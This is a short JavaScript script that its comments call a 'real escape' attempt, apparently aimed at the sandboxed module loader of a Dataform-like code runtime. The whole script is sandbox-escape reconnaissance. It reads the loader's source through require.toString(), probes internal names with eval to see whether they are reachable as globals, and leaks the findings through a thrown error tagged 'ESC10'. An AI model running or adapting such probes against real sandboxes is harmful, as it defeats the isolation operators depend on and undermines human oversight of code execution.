var out = {};
function S(x,n){ try { return String(x).slice(0,n||200); } catch(e){ return "?"; } }
// FINAL: attempt the real escape — can we get a host function reference at all?
// tactic: the loader source is visible via require.toString(); parse out internal names and reach them
var src = require.toString();
out.loader_src_len = src.length;
out.loader_src = src.slice(0, 1500);
// the loader references `f` (Map cache), `d`, `o`, `a`, `path`, `restricted_fs`, `resolve`, `mainWithVersionCheck`, `core`
// Are f/d/o/a reachable as globals?
["f","d","o","a","core","semverGte","mainWithVersionCheck","_DF_SESSION","dataform","_internalError"].forEach(function(n){
  try { eval("out.g_"+n+" = typeof "+n); } catch(e){ out["g_"+n] = "undef"; }
});
throw new Error("ESC10::" + JSON.stringify(out));
